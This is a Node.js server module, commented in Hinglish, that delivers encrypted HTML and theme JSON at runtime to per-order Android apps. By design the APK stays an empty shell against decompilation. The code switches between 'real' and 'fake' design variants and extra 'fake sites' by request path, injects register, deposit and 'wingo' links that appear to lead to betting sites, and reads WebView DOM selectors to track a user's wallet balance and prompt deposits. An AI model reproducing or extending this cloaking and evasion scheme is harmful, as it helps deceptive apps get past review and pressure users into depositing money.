'use strict';

// ─────────────────────────────────────────────────────────────────────────────
// appcontent.js — RUNTIME HTML SERVER (remote content system)
//
// APK me ab popup HTML embed NAHI hota. App launch hote hi server se
// encrypted HTML fetch karta hai:
//   GET /api/app-content/:path          → popup HTML (.bin, fixed key)
//   GET /api/app-content/:path/loading  → loading HTML (.bin, fixed key)
//
// Fayde:
//   - APK me koi Firebase detail ya design HTML nahi hota — decompile karo
//     to sirf khali shell milta hai
//   - Design/links change ho to bina naya APK banaye sab update ho jata hai
//   - HTML server pe bhi encrypted serve hota hai (fixed password), aur
//     transport HTTPS hai
// ─────────────────────────────────────────────────────────────────────────────

const fs = require('fs');
const os = require('os');
const path = require('path');
const db = require('../database/db');
const { encryptHtmlToBin, FIXED_PASSWORD } = require('./encrypt');
const { extractDomain, buildUrls, injectParams, isDhaniUrl } = require('./htmlprocessor');
const { ensureAudioGate, normalizeRegisterDelay, stripIntroSnippet, stripFirebaseLiveScript } = require('./apkbuilder');

const TEMPLATES_DIR = path.join(__dirname, '..', 'templates');
const UPLOADS_DIR = path.join(__dirname, '..', 'uploads');

function normalizePathKey(value) {
  const p = String(value || '').trim();
  if (!/^[a-zA-Z0-9_-]{1,80}$/.test(p)) return null;
  return p;
}

// ── kid path-suffix parser (Java per-build keys) ──
// Naye Java APKs path ke aage "~<24-hex-kid>" bhejte hain (MainActivity
// source change ke bina kid travel karne ka tareeka). Split karke baaki
// poora lookup unchanged rakhte hain.
function splitPathKid(raw) {
  const m = String(raw || '').match(/^(.*)~([a-f0-9]{24})$/);
  return m ? { key: m[1], kid: m[2] } : { key: String(raw || ''), kid: null };
}

// Order dhundo — real, primary fake, ya EXTRA fake site (order_fake_sites)
// path — teeno me se kisi bhi path pe content serve hota hai.
function findOrderByPath(pathKey) {
  const p = normalizePathKey(pathKey);
  if (!p) return null;
  const row = db.prepare(`
    SELECT o.*, d.popup_html_file, d.fake_popup_html_file, d.java_type, d.category
    FROM orders o JOIN designs d ON d.id = o.design_id
    WHERE lower(o.firebase_path) = lower(?) OR lower(o.fake_firebase_path) = lower(?)
    ORDER BY o.id DESC LIMIT 1
  `).get(p, p);
  if (row) {
    const pathIsFake = row.fake_firebase_path && String(row.fake_firebase_path).toLowerCase() === p.toLowerCase();
    // FAKE-ONLY order (build_mode='fake'): iska fake_firebase_path NULL hota hai
    // (single path par single fake APK), isliye path-match se isFake=false aa jata
    // tha aur server REAL design bhej deta tha — BUG. Fake-only order ko hamesha
    // fake treat karo (design_variant='fake'; legacy rows ke liye heuristic:
    // fake_register_url set + fake_firebase_path null = fake-only).
    const orderIsFakeOnly = String(row.design_variant || '').toLowerCase() === 'fake'
      || (!row.fake_firebase_path && !!row.fake_register_url);
    return { row, isFake: !!(pathIsFake || orderIsFakeOnly) };
  }
  // Extra fake site ka path?
  const fs = db.prepare(`
    SELECT o.*, d.popup_html_file, d.fake_popup_html_file, d.java_type, d.category,
           f.register_url  AS fs_register_url,
           f.firebase_path AS fs_firebase_path,
           f.deposit_url   AS fs_deposit_url,
           f.wingo_url     AS fs_wingo_url,
           f.domain        AS fs_domain
    FROM order_fake_sites f
    JOIN orders o  ON o.id = f.order_id
    JOIN designs d ON d.id = o.design_id
    WHERE lower(f.firebase_path) = lower(?)
    ORDER BY f.id DESC LIMIT 1
  `).get(p);
  if (!fs) return null;
  return { row: fs, isFake: true, fakeSite: fs };
}

async function encryptToBuffer(html, password) {
  const tmp = path.join(os.tmpdir(), `zayro_content_${Date.now()}_${Math.random().toString(36).slice(2)}.bin`);
  try {
    await encryptHtmlToBin(html, tmp, password || FIXED_PASSWORD);
    const buf = fs.readFileSync(tmp);
    fs.unlinkSync(tmp);
    return buf;
  } catch (e) {
    try { fs.unlinkSync(tmp); } catch (_) {}
    return null;
  }
}

// ── PER-BUILD KEY RESOLVER (Flutter engine) ──
// Flutter APK content fetch karte waqt ?kid=<key_id> bhejta hai. Uski apni
// unique password se response encrypt hota hai — ek build crack hui to
// sirf waheen tak blast radius. kid na ho / na mile (ya row inactive ho)
// to FIXED_PASSWORD fallback — purane Java APKs waise hi chalte rahte hain
// (key history: rebuild pe nayi kid aati hai, purani active hi rehti hai).
function resolveContentPassword(pathKey, kid) {
  try {
    const k = String(kid || '').trim();
    if (!/^[a-zA-Z0-9_-]{16,40}$/.test(k)) return FIXED_PASSWORD;
    const row = db.prepare(
      'SELECT key_secret, engine FROM build_keys WHERE key_id=? AND firebase_path=? AND active=1 ORDER BY id DESC LIMIT 1'
    ).get(k, String(pathKey || ''));
    if (row && row.key_secret) {
      // java builds: key_secret = plaintext base64 string (APK String se match).
      // flutter builds: base64 enc bytes — dono engines ka format alag hai.
      return row.engine === 'java' ? row.key_secret : Buffer.from(row.key_secret, 'base64');
    }
  } catch (_) {}
  return FIXED_PASSWORD;
}

function buildParams(orderRow, designRow, isFake, fakeSite) {
  // Extra fake site (order_fake_sites) ho to uske apne links/path use karo
  let registerUrl, firebasePath, depositUrl, wingoUrl, domain;
  if (fakeSite && fakeSite.fs_register_url) {
    registerUrl = fakeSite.fs_register_url;
    firebasePath = fakeSite.fs_firebase_path;
    depositUrl = fakeSite.fs_deposit_url;
    wingoUrl = fakeSite.fs_wingo_url;
    domain = fakeSite.fs_domain;
    if (!depositUrl || !wingoUrl || !domain) {
      const isDhani2 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
      const urls2 = buildUrls(registerUrl, isDhani2);
      depositUrl = depositUrl || urls2.deposit;
      wingoUrl = wingoUrl || urls2.wingo;
      domain = domain || extractDomain(registerUrl);
    }
  } else {
    // Fake-only orders me fake_* columns khaali ho sakte hain (single-path order)
    // — tab main columns use karo (unme hi fake values hoti hain). Both-mode
    // fake ke liye fake_* set hote hain, to behavior bilkul same rehta hai.
    registerUrl = (isFake ? orderRow.fake_register_url : null) || orderRow.register_url;
    firebasePath = (isFake ? orderRow.fake_firebase_path : null) || orderRow.firebase_path;
    const isDhani3 = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani';
    const urls3 = buildUrls(registerUrl, isDhani3);
    depositUrl = urls3.deposit;
    wingoUrl = urls3.wingo;
    domain = extractDomain(registerUrl);
  }
  if (!registerUrl) return null;
  const isDhani = designRow.java_type === 'dhani' || designRow.java_type === 'premium' || designRow.category === 'dhani' || isDhaniUrl(registerUrl);
  let appIconBase64 = null;
  if (orderRow.icon_file) {
    const iconPath = path.join(UPLOADS_DIR, orderRow.icon_file);
    if (fs.existsSync(iconPath)) {
      try { appIconBase64 = fs.readFileSync(iconPath).toString('base64'); } catch (_) {}
    }
  }
  return {
    registerUrl,
    depositUrl,
    wingoUrl,
    domain,
    firebasePath,
    minDeposit: orderRow.min_deposit || 300,
    brandTitle: (orderRow.brand_title || '').trim() || orderRow.app_name,
    appIconBase64,
    isDhani
  };
}

// kind: 'popup' | 'loading'
async function buildAppContent(pathKey, kind = 'popup', kid = null) {
  try {
    const sp = splitPathKid(pathKey);
    pathKey = sp.key;
    if (!kid) kid = sp.kid;
    const found = findOrderByPath(pathKey);
    if (!found) return null;
    const { row, isFake, fakeSite } = found;
    const design = {
      popup_html_file: row.popup_html_file,
      fake_popup_html_file: row.fake_popup_html_file,
      java_type: row.java_type,
      category: row.category
    };
    const params = buildParams(row, design, isFake, fakeSite);
    if (!params) return null;

    let html;
    if (kind === 'loading') {
      const loadingName = db.prepare('SELECT value FROM settings WHERE key=?').get('loading_html_file')?.value || 'loading.html';
      const lp = path.join(TEMPLATES_DIR, loadingName);
      if (!fs.existsSync(lp)) return null;
      html = stripFirebaseLiveScript(stripIntroSnippet(injectParams(fs.readFileSync(lp, 'utf8'), params)));
    } else {
      const popupName = isFake ? design.fake_popup_html_file : design.popup_html_file;
      const pp = path.join(TEMPLATES_DIR, popupName);
      if (!fs.existsSync(pp)) return null;
      const raw = fs.readFileSync(pp, 'utf8');
      html = normalizeRegisterDelay(ensureAudioGate(injectParams(raw, params), params.domain));
    }

    return await encryptToBuffer(html, resolveContentPassword(pathKey, kid));
  } catch (e) {
    return null;
  }
}

// ── NATIVE THEME JSON (Flutter engine — HYBRID design update) ──
// Flutter APK ka UI compiled Dart me hota hai. Design ke VARIABLE parts
// (links, colors, texts, amounts, selectors, sound map) yahan se encrypted
// JSON me aate hain — server pe edit karo, app next launch pe naya theme
// le leti hai. Bina APK rebuild ke rozmarra ke changes.
async function buildAppTheme(pathKey, kid = null) {
  const sp0 = splitPathKid(pathKey);
  pathKey = sp0.key;
  if (!kid) kid = sp0.kid;
  try {
    const found = findOrderByPath(pathKey);
    if (!found) return null;
    const { row, isFake, fakeSite } = found;
    const design = {
      popup_html_file: row.popup_html_file,
      fake_popup_html_file: row.fake_popup_html_file,
      java_type: row.java_type,
      category: row.category
    };
    const params = buildParams(row, design, isFake, fakeSite);
    if (!params) return null;

    const designRow = db.prepare('SELECT native_key, name FROM designs WHERE id=?').get(row.design_id);
    const theme = {
      v: 1,
      engine: 'flutter',
      designKey: (designRow && designRow.native_key) ? designRow.native_key : 'default',
      brandTitle: params.brandTitle || '',
      minDeposit: params.minDeposit || 300,
      urls: {
        register: params.registerUrl,
        deposit: params.depositUrl,
        wingo: params.wingoUrl,
        domain: params.domain
      },
      liveLinkEnabled: !!row.live_link_enabled,
      colors: {
        bg: '#050310',
        primary: (row.theme_color && String(row.theme_color).trim()) || '#ff1e1e',
        accent: '#ffb700',
        text: '#ffffff',
        danger: '#ff4d6d'
      },
      // Gate selectors — logged-in / balance detect karne ke liye WebView
      // DOM me ye dekhe jaate hain (HTML gate ke __sel wale same defaults).
      selectors: {
        balance: [
          '.amount .a1 .a', '.gameHeader__C-balance', '.Wallet__C-balance-l1',
          '.walletInfo__C-balance', '.headerInfo__C-right', '.header__money',
          '.header-money', '.top-bar__balance', '.userInfo__C-balance',
          '.balance-amount', '.my-amount', '.balance', '.wallet-amount'
        ],
        userInfo: '.userInfo, .user-info, .headerInfo, [class*=user-info], [class*=userInfo], [class*=avatar], .my__info'
      },
      sounds: {
        register: 'register.mp3',
        loginSuccess: 'successful.mp3',
        lowBalance: 'lowbalance.mp3',
        intro: 'intro.mp3'
      },
      texts: {
        networkProblem: 'Network Problem',
        retry: 'RETRY',
        depositTitle: 'LOW BALANCE',
        depositSubtitle: 'Wallet me minimum deposit karein',
        warnTitle: 'ALREADY REGISTERED?',
        warnMsg: 'Ye number pehle se registered lag raha hai. Login karein.',
        securityFailed: 'Security Verification Failed',
        securityFailedSub: 'This app cannot run on this device. Please install the official version.'
      },
      orderId: row.id,
      updatedAt: Date.now()
    };

    return await encryptToBuffer(JSON.stringify(theme), resolveContentPassword(pathKey, kid));
  } catch (e) {
    return null;
  }
}

module.exports = { buildAppContent, buildAppTheme, resolveContentPassword };
